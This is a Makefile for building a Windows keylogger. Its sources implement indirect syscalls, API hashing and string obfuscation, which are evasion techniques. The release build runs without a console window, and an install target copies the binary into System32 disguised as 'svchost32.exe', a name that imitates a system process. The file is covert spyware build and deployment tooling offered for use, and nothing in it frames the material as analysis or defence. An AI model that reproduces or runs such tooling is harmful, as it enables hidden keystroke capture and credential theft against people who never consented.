# Compiler
CXX = g++
AS = as
WINDRES = windres

# Compiler flags
CXXFLAGS = -std=c++17 -Wall -Wextra -O2
LDFLAGS = -static -mwindows

# Target binary
TARGET = keylogger.exe
TARGET_DEBUG = keylogger_debug.exe

# Source files
SOURCES = main.cpp IndirectSyscalls.cpp APIHashing.cpp
ASM_SOURCES = dosyscall.S
ASM_OBJECTS = dosyscall.o
HEADERS = Keylogger.h APIHashing.h StringObfuscation.h IndirectSyscalls.h

# Default target
all: release

# Assemble the syscall stub
$(ASM_OBJECTS): $(ASM_SOURCES)
	@echo [*] Assembling dosyscall.S...
	$(CXX) -c $(ASM_SOURCES) -o $(ASM_OBJECTS)

# Release build (no console window)
release: $(ASM_OBJECTS) $(SOURCES) $(HEADERS)
	@echo [*] Building release version (no console)...
	$(CXX) $(CXXFLAGS) $(LDFLAGS) -o $(TARGET) $(SOURCES) $(ASM_OBJECTS)
	@echo [+] Build complete: $(TARGET)
	@echo [i] Size: $$(du -h $(TARGET) | cut -f1)

# Debug build (with console)
debug: $(ASM_OBJECTS) $(SOURCES) $(HEADERS)
	@echo [*] Building debug version (with console)...
	$(CXX) $(CXXFLAGS) -static -o $(TARGET_DEBUG) $(SOURCES) $(ASM_OBJECTS)
	@echo [+] Build complete: $(TARGET_DEBUG)
	@echo [+] Build complete: $(TARGET_DEBUG)

# Clean build artifacts
clean:
	@echo [*] Cleaning build artifacts...
	rm -f $(TARGET) $(TARGET_DEBUG) $(ASM_OBJECTS) *.o
	@echo [+] Clean complete

# Run debug version
run-debug: debug
	@echo [*] Running debug version...
	./$(TARGET_DEBUG)

# Run release version
run: release
	@echo [*] Running release version...
	./$(TARGET)

# Install (copy to system directory - requires admin)
install: release
	@echo [*] Installing to C:\\Windows\\System32...
	@echo [!] This requires administrator privileges
	cp $(TARGET) /c/Windows/System32/svchost32.exe
	@echo [+] Installed as svchost32.exe

# Uninstall
uninstall:
	@echo [*] Removing from system directory...
	rm -f /c/Windows/System32/svchost32.exe
	@echo [+] Uninstalled

# Help
help:
	@echo Available targets:
	@echo   make          - Build release version (no console)
	@echo   make release  - Build release version (no console)
	@echo   make debug    - Build debug version (with console)
	@echo   make clean    - Remove build artifacts
	@echo   make run      - Build and run release version
	@echo   make run-debug - Build and run debug version
	@echo   make install  - Install to system directory (admin required)
	@echo   make uninstall - Remove from system directory
	@echo   make help     - Show this help message

.PHONY: all release debug clean run run-debug install uninstall help
